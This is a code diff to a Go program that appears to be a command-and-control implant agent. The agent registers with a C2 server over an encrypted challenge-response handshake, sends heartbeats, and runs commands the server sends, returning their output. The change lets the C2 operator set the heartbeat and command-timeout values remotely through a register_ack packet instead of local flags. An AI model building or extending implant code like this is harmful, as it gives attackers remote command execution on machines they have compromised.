@@ -20,6 +20,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"sync"
 	"time"
 )
@@ -31,16 +32,12 @@ type options struct {
 	c2Address        string
 	agentID          string
 	authToken        string
-	heartbeat        int
-	cmdTimeout       int
 	reconnectInitial float64
 	reconnectMax     float64
 }
 
 func (o *options) init() {
 	o.configPath = defaultConfigPath
-	o.heartbeat = 30
-	o.cmdTimeout = 60
 	o.reconnectInitial = 1
 	o.reconnectMax = 60
 }
@@ -49,8 +46,6 @@ type fileConfig struct {
 	C2Address        string  `json:"c2_address"`
 	AgentID          string  `json:"agent_id"`
 	AuthToken        string  `json:"auth_token"`
-	Heartbeat        int     `json:"heartbeat_interval_sec"`
-	CmdTimeout       int     `json:"cmd_timeout"`
 	ReconnectInitial float64 `json:"reconnect_initial_sec"`
 	ReconnectMax     float64 `json:"reconnect_max_sec"`
 }
@@ -74,12 +69,6 @@ func loadConfigFile(path string, o *options) {
 	}
 	if fc.AuthToken != "" {
 		o.authToken = fc.AuthToken
-	}
-	if fc.Heartbeat > 0 {
-		o.heartbeat = fc.Heartbeat
-	}
-	if fc.CmdTimeout > 0 {
-		o.cmdTimeout = fc.CmdTimeout
 	}
 	if fc.ReconnectInitial > 0 {
 		o.reconnectInitial = fc.ReconnectInitial
@@ -116,8 +105,6 @@ func main() {
 	fs.StringVar(&o.c2Address, "c2-address", o.c2Address, "C2 host:port (required)")
 	fs.StringVar(&o.agentID, "agent-id", o.agentID, "unique agent id (required)")
 	fs.StringVar(&o.authToken, "auth-token", o.authToken, "pre-shared auth token (required)")
-	fs.IntVar(&o.heartbeat, "heartbeat-interval", o.heartbeat, "heartbeat interval seconds")
-	fs.IntVar(&o.cmdTimeout, "cmd-timeout", o.cmdTimeout, "command execution timeout seconds")
 	fs.Float64Var(&o.reconnectInitial, "reconnect-initial", o.reconnectInitial, "initial reconnect delay seconds")
 	fs.Float64Var(&o.reconnectMax, "reconnect-max", o.reconnectMax, "max reconnect delay seconds")
 	_ = fs.Parse(os.Args[1:])
@@ -125,19 +112,13 @@ func main() {
 	if o.c2Address == "" || o.agentID == "" || o.authToken == "" {
 		log.Fatal("missing required config: c2_address, agent_id, auth_token (via flags or --config)")
 	}
-	if o.heartbeat < 1 {
-		o.heartbeat = 1
-	}
-	if o.cmdTimeout < 1 {
-		o.cmdTimeout = 1
-	}
-
-	log.Printf("agent '%s' starting; C2=%s (heartbeat=%ds, cmd_timeout=%ds)",
-		o.agentID, o.c2Address, o.heartbeat, o.cmdTimeout)
+	log.Printf("agent '%s' starting; C2=%s (timing supplied by C2 register_ack)",
+		o.agentID, o.c2Address)
 	os.Exit(run(&o))
 }
 
 func run(o *options) int {
+	rc := newRuntimeConfig()
 	delay := o.reconnectInitial
 	if delay < 1 {
 		delay = 1
@@ -155,7 +136,7 @@ func run(o *options) int {
 		}
 		log.Printf("connected to %s", o.c2Address)
 
-		enc, pr, err := handshake(conn, o)
+		enc, pr, err := handshake(conn, o, rc)
 		if err != nil {
 			log.Printf("registration handshake failed: %v", err)
 			_ = conn.Close()
@@ -174,9 +155,9 @@ func run(o *options) int {
 		// Heartbeats run on their own goroutine so a long command execution
 		// (which blocks the serve loop) cannot starve them.
 		stopHB := make(chan struct{})
-		go heartbeatLoop(enc, time.Duration(o.heartbeat)*time.Second, stopHB)
+		go heartbeatLoop(enc, rc, stopHB)
 
-		shutdown := serve(enc, pr, o)
+		shutdown := serve(enc, pr, o, rc)
 		close(stopHB)
 		_ = enc.Close()
 		if shutdown {
@@ -190,20 +171,22 @@ func run(o *options) int {
 }
 
 // heartbeatLoop sends a heartbeat every interval on its own goroutine,
-// independent of command execution. It stops when stop is closed or a write
-// fails (connection gone).
-func heartbeatLoop(conn net.Conn, interval time.Duration, stop <-chan struct{}) {
-	if interval <= 0 {
-		interval = 30 * time.Second
-	}
-	ticker := time.NewTicker(interval)
-	defer ticker.Stop()
+// independent of command execution. The interval is re-read each cycle from
+// the shared runtime config, so a register_ack update takes effect without a
+// restart. It stops when stop is closed or a write fails (connection gone).
+func heartbeatLoop(conn net.Conn, rc *runtimeConfig, stop <-chan struct{}) {
 	var reqID uint64 = 3 // 1=register, 2=register_confirm
 	for {
+		interval := rc.heartbeatInterval()
+		if interval <= 0 {
+			interval = 30 * time.Second
+		}
+		timer := time.NewTimer(interval)
 		select {
 		case <-stop:
+			timer.Stop()
 			return
-		case <-ticker.C:
+		case <-timer.C:
 			if err := sendHeartbeat(conn, reqID); err != nil {
 				return
 			}
@@ -225,7 +208,7 @@ func nextDelay(d, max float64) float64 {
 // handshake performs the challenge-response registration and returns the
 // encrypted connection plus the packet reader (which may hold decrypted
 // leftovers for the serve loop).
-func handshake(conn net.Conn, o *options) (*encryptedConn, *packetReader, error) {
+func handshake(conn net.Conn, o *options, rc *runtimeConfig) (*encryptedConn, *packetReader, error) {
 	pr := &packetReader{}
 	nonce := randomHex(16)
 	if _, err := conn.Write(buildRequest(1, cmdRegister, []string{nonce})); err != nil {
@@ -280,7 +263,42 @@ func handshake(conn net.Conn, o *options) (*encryptedConn, *packetReader, error)
 	if _, err := enc.Write(confirm); err != nil {
 		return nil, nil, err
 	}
+
+	// The C2 replies with the encrypted timing parameters for this connection.
+	enc.decryptBuffered(pr)
+	if err := waitRegisterAck(enc, pr, rc); err != nil {
+		return nil, nil, err
+	}
 	return enc, pr, nil
+}
+
+// applyRegisterAck parses register_ack([heartbeat_interval_sec, cmd_timeout]).
+func applyRegisterAck(body []byte, rc *runtimeConfig) error {
+	params, err := decodeTLV(body)
+	if err != nil || len(params) < 2 {
+		return fmt.Errorf("invalid register_ack payload")
+	}
+	heartbeat, herr := strconv.Atoi(params[0])
+	cmdTimeout, cerr := strconv.Atoi(params[1])
+	if herr != nil || cerr != nil ||
+		heartbeat <= 0 || heartbeat > maxRuntimeTimingSec ||
+		cmdTimeout <= 0 || cmdTimeout > maxRuntimeTimingSec {
+		return fmt.Errorf("invalid register_ack values")
+	}
+	rc.set(heartbeat, cmdTimeout)
+	return nil
+}
+
+// waitRegisterAck reads the first encrypted C2 packet after register_confirm.
+func waitRegisterAck(conn net.Conn, pr *packetReader, rc *runtimeConfig) error {
+	pkt, err := readPacket(conn, pr, 30*time.Second)
+	if err != nil {
+		return err
+	}
+	if pkt.cmd != cmdRegisterAck {
+		return fmt.Errorf("expected register_ack, got %#x", pkt.cmd)
+	}
+	return applyRegisterAck(pkt.body, rc)
 }
 
 type dispatchResult int
@@ -291,7 +309,7 @@ const (
 	stopShutdown
 )
 
-func serve(conn net.Conn, pr *packetReader, o *options) bool {
+func serve(conn net.Conn, pr *packetReader, o *options, rc *runtimeConfig) bool {
 	buf := make([]byte, 4096)
 	for {
 		pkt, err := pr.next()
@@ -299,7 +317,7 @@ func serve(conn net.Conn, pr *packetReader, o *options) bool {
 			return false
 		}
 		if pkt != nil {
-			switch dispatch(conn, pr, pkt, o) {
+			switch dispatch(conn, pr, pkt, o, rc) {
 			case stopShutdown:
 				return true
 			case stopDisconnect:
@@ -317,9 +335,13 @@ func serve(conn net.Conn, pr *packetReader, o *options) bool {
 	}
 }
 
-func dispatch(conn net.Conn, pr *packetReader, pkt *packet, o *options) dispatchResult {
+func dispatch(conn net.Conn, pr *packetReader, pkt *packet, o *options, rc *runtimeConfig) dispatchResult {
 	switch pkt.cmd {
 	case cmdHeartbeatAck, cmdRegisterResponse:
+		return cont
+	case cmdRegisterAck:
+		// A repeated ACK may refresh the runtime timing.
+		_ = applyRegisterAck(pkt.body, rc)
 		return cont
 	case cmdHeartbeat:
 		_ = send(conn, buildResponse(pkt.reqID, cmdHeartbeatAck, string(pkt.body)))
@@ -343,7 +365,7 @@ func dispatch(conn net.Conn, pr *packetReader, pkt *packet, o *options) dispatch
 			_ = send(conn, buildResponse(pkt.reqID, pkt.cmd, "Error: bad TLV"))
 			return cont
 		}
-		result := capOutput(runAction(pkt.cmd, params, time.Duration(o.cmdTimeout)*time.Second), false)
+		result := capOutput(runAction(pkt.cmd, params, rc.commandTimeout()), false)
 		_ = send(conn, buildResponse(pkt.reqID, pkt.cmd, result))
 		return cont
 	}
